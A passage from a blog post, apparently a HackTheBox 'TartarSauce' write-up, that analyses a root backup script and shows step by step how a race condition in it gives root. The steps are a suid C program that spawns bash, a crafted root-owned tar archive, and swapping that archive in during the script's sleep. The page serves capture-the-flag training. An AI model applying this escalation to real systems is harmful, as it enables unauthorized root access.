+<span class="nv">tmpfile</span><span class="o">=</span><span class="nv">$tmpdir</span>/.<span class="k">$(</span>/usr/bin/head -c100 /dev/urandom <span class="p">|</span>sha1sum<span class="p">|</span>cut -d<span class="s1">&#39; &#39;</span> -f1<span class="k">)</span>
+<span class="nv">check</span><span class="o">=</span><span class="nv">$tmpdir</span>/check
+
+<span class="c1"># formatting</span>
+printbdr<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">for</span> n in <span class="k">$(</span>seq <span class="m">72</span><span class="k">)</span><span class="p">;</span>
+    <span class="k">do</span> /usr/bin/printf <span class="s2">$&quot;-&quot;</span><span class="p">;</span>
+    <span class="k">done</span>
+<span class="o">}</span>
+<span class="nv">bdr</span><span class="o">=</span><span class="k">$(</span>printbdr<span class="k">)</span>
+
+<span class="c1"># Added a test file to let us see when the last backup was run</span>
+/usr/bin/printf $<span class="s2">&quot;</span><span class="nv">$bdr</span><span class="s2">\nAuto backup backuperer backup last ran at : </span><span class="k">$(</span>/bin/date<span class="k">)</span><span class="s2">\n</span><span class="nv">$bdr</span><span class="s2">\n&quot;</span> &gt; <span class="nv">$testmsg</span>
+
+<span class="c1"># Cleanup from last time.</span>
+/bin/rm -rf <span class="nv">$tmpdir</span>/.* <span class="nv">$check</span>
+
+<span class="c1"># Backup onuma website dev files.</span>
+/usr/bin/sudo -u onuma /bin/tar -zcvf <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> <span class="p">&amp;</span>
+
+<span class="c1"># Added delay to wait for backup to complete if large files get added.</span>
+/bin/sleep <span class="m">30</span>
+
+<span class="c1"># Test the backup integrity</span>
+integrity_chk<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/diff -r <span class="nv">$basedir</span> <span class="nv">$check$basedir</span>
+<span class="o">}</span>
+
+/bin/mkdir <span class="nv">$check</span>
+/bin/tar -zxvf <span class="nv">$tmpfile</span> -C <span class="nv">$check</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>integrity_chk<span class="k">)</span> <span class="o">]]</span>
+<span class="k">then</span>
+    <span class="c1"># Report errors so the dev can investigate the issue.</span>
+    /usr/bin/printf $<span class="s2">&quot;</span><span class="nv">$bdr</span><span class="s2">\nIntegrity Check Error in backup last ran :  </span><span class="k">$(</span>/bin/date<span class="k">)</span><span class="s2">\n</span><span class="nv">$bdr</span><span class="s2">\n</span><span class="nv">$tmpfile</span><span class="s2">\n&quot;</span> &gt;&gt; <span class="nv">$errormsg</span>
+    integrity_chk &gt;&gt; <span class="nv">$errormsg</span>
+    <span class="nb">exit</span> <span class="m">2</span>
+<span class="k">else</span>
+    <span class="c1"># Clean up and save archive to the bkpdir.</span>
+    /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
+    /bin/rm -rf <span class="nv">$check</span> .*
+    <span class="nb">exit</span> <span class="m">0</span>
+<span class="k">fi</span>
+</pre></div>
+
+
+<p>To sum up, the script performs the following steps:</p>
+<ol>
+<li>Cleans up the last extracted directory with <code>/bin/rm -rf $tmpdir/.* $check</code></li>
+<li>Backs up the <code>$basedir</code> directory to <code>/var/tmp/$SHA1-RANDOM-FILENAME$</code> with <code>/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir</code></li>
+<li>Sleeps for 30 seconds to allow the backup to complete.</li>
+<li>Runs the integrity_check function, comparing the current <code>/var/www/html</code> with the previously checked <code>/var/tmp/check/var/www/html</code>. </li>
+<li>If the directories are different, then it prints an error message to the log, and does not remove the /var/tmp/check directory.</li>
+<li>If the directories match, it moves the current tar package to <code>/var/backups/onuma-www-dev.bak</code>, and delete the <code>/var/tmp/check directory</code>.</li>
+</ol>
+<p>Even though I understand what the script does, I didn't know how to leverage it to privesc to root since I had no persmissions to edit it. I ended up looking this up and I found this <a href="https://0xdf.gitlab.io/2018/10/21/htb-tartarsauce-part-2-backuperer-follow-up.html">article</a> which clarified all my concerns I made me understand the mechanism and why I missed it.</p>
+<p>So according to that article we can take advantage of the 30 seconds sleep and the fact that tar will extract items while maintaining root permissions. </p>
+<h1>Getting a root shell:</h1>
+<p>The first step consists on creating a <code>suid.c</code> file containing the following code:</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>then I compile the <code>suid.c</code></p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="err">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">tartarsauce</span><span class="err">#</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">o</span> <span class="n">suid</span> <span class="n">suid</span><span class="p">.</span><span class="n">c</span>
+<span class="n">suid</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">main</span><span class="err">’</span><span class="o">:</span>
+<span class="n">suid</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">2</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">setresuid</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
+    <span class="mi">2</span> <span class="o">|</span>   <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+      <span class="o">|</span>   <span class="o">^~~~~~~~~</span>
+<span class="n">suid</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">system</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
+    <span class="mi">3</span> <span class="o">|</span>   <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+      <span class="o">|</span>   <span class="o">^~~~~~</span>
+</pre></div>
+
+
+<p>and I verify that the suid file is created:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# ll</span>
+<span class="err">total 36</span>
+<span class="err">-rwxrwxr-x 1 root root 15532 Feb 12 17:37 suid</span>
+<span class="err">-rwxrwxr-x 1 root root    63 Feb 12 17:28 suid.c</span>
+</pre></div>
+
+
+<p>I also add the suid to the previously generated <code>suid</code> file as follow:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# chmod 6555 suid</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# ll</span>
+<span class="err">total 36</span>
+<span class="err">-r-sr-sr-x 1 root root 15532 Feb 12 17:37 suid</span>
+<span class="err">-rwxrwxr-x 1 root root    63 Feb 12 17:28 suid.c</span>
+</pre></div>
+
+
+<p>Next we create the archive with the /var/www/html directory struture as explained in the article:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# mkdir -p  var/www/html</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# cp suid var/www/html/</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# chmod 6555 var/www/html/suid</span>
+<span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# tar zcvf suid.tar.gz var --owner=root --group=root</span>
+<span class="err">var/</span>
+<span class="err">var/www/</span>
+<span class="err">var/www/html/</span>
+<span class="err">var/www/html/suid</span>
+</pre></div>
+
+
+<p>Now I create a simple python webserver on my kali box and I download the <code>suid.tar.gz</code> to tartarsauce.</p>
+<div class="highlight"><pre><span></span><span class="err">onuma@TartarSauce:/var/tmp$ systemctl list-timers</span>
+<span class="c">WARNING: terminal is not fully functional</span>
+<span class="err">NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES</span>
+<span class="err">Wed 2020-02-12 12:58:11 EST  667ms left    Wed 2020-02-12 12:53:11 EST  4min 59s ago backuperer.timer             backuperer.service</span>
+<span class="err">Wed 2020-02-12 16:25:07 EST  3h 26min left Tue 2020-02-11 21:29:44 EST  15h ago      apt-daily.timer              apt-daily.service</span>
+<span class="err">Wed 2020-02-12 23:56:05 EST  10h left      Tue 2020-02-11 23:56:05 EST  13h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span>
+<span class="err">Thu 2020-02-13 06:46:01 EST  17h left      Wed 2020-02-12 06:03:07 EST  6h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service</span>
+</pre></div>
+
+
+<p>I monitor the timers with the above command and when I see the 5 minutes are approaching I check the directory to see the file with the random sha1 name created:</p>
+<div class="highlight"><pre><span></span><span class="err">onuma@TartarSauce:/var/tmp$ ll                   </span>
+<span class="err">total 11280</span>
+<span class="err">drwxrwxrwt  8 root  root      4096 Feb 12 12:58 ./</span>
+<span class="err">drwxr-xr-x 14 root  root      4096 Feb  9  2018 ../</span>
+<span class="err">-rw-r--r--  1 onuma onuma 11511681 Feb 12 12:58 .82e3d10b54248c5366b81b2bb93d54549b08e92e</span>
+<span class="err">-rw-r--r--  1 onuma onuma     2771 Feb 12 12:47 suid.tar.gz</span>
+</pre></div>
+
+
+<p>then I replace that file with the <code>suid.tar.gz</code></p>
+<div class="highlight"><pre><span></span><span class="err">onuma@TartarSauce:/var/tmp$ cp suid.tar.gz .82e3d10b54248c5366b81b2bb93d54549b08e92e</span>
+</pre></div>
+
+
+<p>and then I wait 30 seconds and I move to the check directory and check that the suid file has been created:</p>
+<div class="highlight"><pre><span></span><span class="err">onuma@TartarSauce:/var/tmp$ cd check/var/www/html/</span>
+<span class="err">onuma@TartarSauce:/var/tmp/check/var/www/html$ ll</span>
+<span class="err">total 24</span>
+<span class="err">drwxrwxr-x 2 root root  4096 Feb 12 12:44 ./</span>
+<span class="err">drwxrwxr-x 3 root root  4096 Feb 12 12:44 ../</span>
+<span class="err">-r-sr-sr-x 1 root root 15532 Feb 12 12:44 suid*</span>
+</pre></div>
+
+
+<p>then I execute it and can verify that I am root:</p>
+<div class="highlight"><pre><span></span><span class="err">onuma@TartarSauce:/var/tmp/check/var/www/html$ ./suid </span>
+<span class="err">root@TartarSauce:/var/tmp/check/var/www/html# id</span>
+<span class="err">uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)</span>
+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
